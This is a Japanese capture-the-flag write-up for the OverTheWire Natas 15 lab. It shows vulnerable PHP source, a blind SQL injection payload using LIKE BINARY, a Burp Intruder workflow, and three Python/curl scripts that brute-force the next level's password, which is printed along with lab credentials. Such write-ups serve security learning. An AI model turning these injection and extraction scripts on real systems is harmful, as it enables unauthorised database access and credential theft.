# Natas15
```
Username: natas15
Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
URL:      http://natas15.natas.labs.overthewire.org
```
UsernameだけでNatas14と同じくSQLインジェクションが使えると思うが違う。  
とりあえず`View sourcecode`
```
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
```

Usernameを入力して、そのユーザーが存在するか否かを判定している。　　
次のLevelのnatas16を入力するとThis user exists.(このユーザーは存在する)と返される。　　
それ以外だとThis user doesn't exist.(存在しません)と返される。　　

natas16の後にパスワードを判定する処理を行わせて「その文字が使われているか？」を判定する。  
SQLのLIKE BINARYを使用して判定を行う。(binaryは大小文字の判定で必須)  

`natas16" and password like binary "%a%を送るとThis user exists.`が帰ってくる。  
つまり、パスワードの中にaという文字が使われているのがわかる。  

しかし
```
abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
```
の全てを試すのはしんどいので、

> ## 方法1: Pythonを使用する
```
import os

payload = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
access = "curl 'http://natas15.natas.labs.overthewire.org/index.php'   -H 'Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA=='   -H 'Connection: keep-alive'   -H 'Origin: http://natas15.natas.labs.overthewire.org'   -H 'Referer: http://natas15.natas.labs.overthewire.org/index.php?debug'   -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'   -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'   -H 'accept-language: en-US,en;q=0.9'   -H 'cache-control: max-age=0'   -H 'content-type: application/x-www-form-urlencoded'   -H 'dnt: 1'   -H 'sec-gpc: 1'   -H 'upgrade-insecure-requests: 1'  --insecure"
for char in payload:
    password = "--data-raw 'username=natas16%22AND+password+LIKE+BINARY+%22%25{}%25%' ".format(char)
    print(password)
    full = access + " " + password

    stuff = os.popen(full).read()
    if "This user exists." in stuff:
        print(char)
```

全ての文字を試して、This user exists.と帰ってきたら単語が表示されるスクリプトである。  
(作成に4時間かかりましたPython初心者)

結果、
`adfgijklqruADEHOPRTVZ23579`が使われているのがわかる。


> ## 方法２Burp Suiteを用いてPayloadをセットし攻撃
`natas16" and password like binary "%a%`を入力した状態でInterceptする。  
そしてaの部分を選択して、`Actiono`から`Send to Intruder`を選択し、Intruderの目標としてセットする。 

Intruderのタブに移動し、Payloadにa~9までをセットし、右上のStart Attackで攻撃を開始する。  

結果画面に表示されている文字列の長さがLengthに表示される。  
試しに一つ選択し、下のResponeからHTMLを読むと、今回は「1104」がThis user exists.の長さだとわかる。  

よって、Lengthが1104の`adfgijklqruADEHOPRTVZ23579`がパスワードの文字として使われているのがわかる。  


次に、この文字を総当たりでアタックさせ、正しい並び、出現回数を突き止める。

今の所、全てのパスワードが32文字なので、32文字を上限として、「全ての文字が１度は使用される」かつ、「32文字」で生成するようにプログラムを変更する。

しかし、総当たりのパターン数は32の32乗あり、先に全て生成してからだとメモリが約1.58 x 10^36 GB必要という悲惨な状況になる。  


だからといい、ループ内で生成してそれを即座に使用しても、32の32乗のパターンを検証するのは、年単位となる(普通にDos攻撃である)ので、もっと効率の良い方法で検証する必要がある。

そこで、文字「a」を基準点とし、aの右に追加→検証→合っていたらその右に追加とやっていき、右に何を入れても合わない(答えの右端に来た)場合は左に追加するようにした。  
↓僕が書いたコード
```
import os

payload = "adfgijklqruADEHOPRTVZ23579"
access = "curl 'http://natas15.natas.labs.overthewire.org/index.php'   -H 'Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA=='   -H 'Connection: keep-alive'   -H 'Origin: http://natas15.natas.labs.overthewire.org'   -H 'Referer: http://natas15.natas.labs.overthewire.org/index.php?debug'   -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'   -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'   -H 'accept-language: en-US,en;q=0.9'   -H 'cache-control: max-age=0'   -H 'content-type: application/x-www-form-urlencoded'   -H 'dnt: 1'   -H 'sec-gpc: 1'   -H 'upgrade-insecure-requests: 1'  --insecure"

password = ""
tried_right = False
while len(password) < 32:
    found = False
    for char in payload:
        if not tried_right:
            test_password = password + char
        else:
            test_password = char + password
        command = "--data-raw 'username=natas16%22AND+password+LIKE+BINARY+%22%25{}%25%' ".format(test_password)
        full_command = access + " " + command
        response = os.popen(full_command).read()
        print(test_password)
        if "This user exists." in response:
            password = test_password
            print("Testing character:", char)
            found = True
            break
    if not found:
        print("Failed to find next character.")
        if not tried_right:
            tried_right = True
        else:
            password = payload[0] + password

print("Generated password:", password)
```

↓メンター様提供
```
import os
foo = "curl 'http://natas15.natas.labs.overthewire.org/index.php'   -H 'Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA=='   -H 'Connection: keep-alive'   -H 'Origin: http://natas15.natas.labs.overthewire.org'   -H 'Referer: http://natas15.natas.labs.overthewire.org/index.php?debug'   -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'   -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'   -H 'accept-language: en-US,en;q=0.9'   -H 'cache-control: max-age=0'   -H 'content-type: application/x-www-form-urlencoded'   -H 'dnt: 1'   -H 'sec-gpc: 1'   -H 'upgrade-insecure-requests: 1'   --data-raw 'username=natas16%22AND+password+LIKE+BINARY%22{0}%25'   --insecure"
guess = ""
alphanumeric = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
while True:
    finished = True
    for char in alphanumeric:
        guess += char
        print("guessing", guess)
        result = os.popen(foo.format(guess)).read()
        if ("This user exists." not in result):
            guess = guess[:-1]
        else:
            finished = False
            continue
    if finished:
        print(guess)
        break
```

少し時間がかかるが、結果を得ることができる。　  
```
hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```